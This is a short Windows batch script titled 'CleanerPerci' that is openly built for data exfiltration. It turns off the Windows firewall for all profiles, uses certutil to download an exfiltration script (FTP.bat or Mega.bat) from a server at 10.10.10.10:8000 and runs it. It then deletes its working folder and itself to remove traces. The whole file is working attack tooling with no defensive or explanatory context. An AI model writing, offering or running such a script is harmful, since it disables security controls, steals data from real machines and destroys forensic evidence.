@echo off

title CleanerPerci

rem set the exfiltration web server and techniques (FTP.bat or Mega.bat)
set exfiltration_techniques="FTP.bat"
set srv="10.10.10.10:8000"

:exfiltration
netsh advfirewall set allprofiles state off
cd C:\Supertools\
certutil.exe -urlcache -split -f http://%srv%/Exfiltration/%exfiltration_techniques% %exfiltration_techniques%
call C:\Supertools\%exfiltration_techniques%
goto deleteall

:deleteall
cd C:/
del /S /Q C:\Supertools
rmdir /S /Q C:\Supertools
if exist C:\Supertools goto deleteall
del %0
exit /b

